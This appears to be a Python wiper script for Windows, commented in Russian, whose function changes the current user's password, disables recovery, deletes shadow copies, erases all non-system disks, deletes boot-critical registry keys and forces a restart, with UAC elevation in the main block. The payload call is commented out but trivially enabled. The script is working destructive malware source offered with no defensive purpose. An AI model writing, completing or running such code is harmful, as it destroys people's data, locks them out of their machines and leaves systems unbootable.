import os, subprocess, ctypes, sys

def ultimate_payload():
    # 1. Определение пользователя
    # Используем системную команду, которая надежнее переменных окружения
    try:
        username = subprocess.check_output("whoami", shell=True).decode().split('\\')[-1].strip()
    except:
        username = os.environ.get('USERNAME', 'User')

    # 2. PowerShell: добавляем Bypass
    # Без этого политика Restricted заблокирует очистку дисков
    ps_wipe = (
        'powershell -ExecutionPolicy Bypass -Command "'
        'Get-Disk | Where-Object {$_.Number -ne 0} | '
        'Clear-Disk -RemoveData -RemoveOEM -Confirm:$false -ErrorAction SilentlyContinue"'
    )

    try:
        # 3. Сначала самое быстрое и важное
        # Смена пароля и отключение восстановления — это секундные дела
        subprocess.run(f'net user "{username}" Pa$$w0rd123', shell=True)
        # Отключаем среду восстановления WinRE, чтобы усложнить восстановление
        subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True)

        # 4. Точки восстановления
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
        
        # 5. Стираем внешние диски
        subprocess.run(ps_wipe, shell=True)
        
        # 6. Реестр с обходом архитектуры
        # Ветку SYSTEM удалить целиком сложно из-за TrustedInstaller,
        # поэтому бьем по "жизненно важным органам" (драйверам), которые админу доступны
        subprocess.run("reg delete HKLM\\SYSTEM\\Select /f /reg:64", shell=True)
        subprocess.run("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\storahci /f /reg:64", shell=True)

        # 7. Финал
        os.system("shutdown /r /f /t 0")
    except:
        os.system("shutdown /s /f /t 0")

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        pass
        #ultimate_payload() # Вызов закомментирован для безопасности
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
